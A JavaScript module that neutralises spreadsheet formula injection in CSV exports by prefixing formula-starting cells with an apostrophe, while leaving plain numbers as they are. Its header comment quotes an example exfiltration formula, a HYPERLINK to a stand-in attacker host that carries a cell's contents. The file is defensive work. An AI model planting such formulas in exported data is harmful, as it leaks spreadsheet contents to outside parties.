/**
 * CSV for files people open in a spreadsheet.
 *
 * Excel, Sheets and LibreOffice treat a cell that starts with = + - or @ as a
 * formula (and tab or carriage return, which some of them strip first). Our
 * exports carry text that editors — and anyone holding a public edit link —
 * can write, so a remark like =HYPERLINK("https://evil.example/?d="&B2,"Open")
 * ran when finance opened the file. Such cells get a leading apostrophe, the
 * OWASP-recommended neutraliser: the spreadsheet shows the text instead of
 * evaluating it. Real numbers, negative ones included, are left alone so the
 * columns still add up.
 *
 * Every frontend CSV export goes through here. (sheet.js's gridToCSV is the
 * Pages storage format, not an export, and deliberately keeps formulas.)
 */
const FORMULA_START = /^[=+\-@\t\r]/
// Digits only (grouping commas and a trailing % allowed): no function, cell
// reference or DDE call fits in that, so "-1,500" and "-12%" stay numbers.
const PLAIN_NUMBER = /^[+-]?(\d[\d,]*(\.\d*)?|\.\d+)([eE][+-]?\d+)?%?$/

/** The cell's text, with formula-starting text neutralised. Not yet quoted. */
export function neutralizeCsvValue(value) {
  if (value == null) return ''
  if (typeof value === 'number') return String(value)
  const s = String(value)
  return FORMULA_START.test(s) && !PLAIN_NUMBER.test(s) ? `'${s}` : s
}

/** One field, neutralised and quoted when it holds a comma, quote or line break. */
export function csvCell(value) {
  const s = neutralizeCsvValue(value)
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
}

export const csvRow = (values) => values.map(csvCell).join(',')

/** Rows (header row included) to CSV text. */
export const toCsv = (rows) => rows.map(csvRow).join('\n')
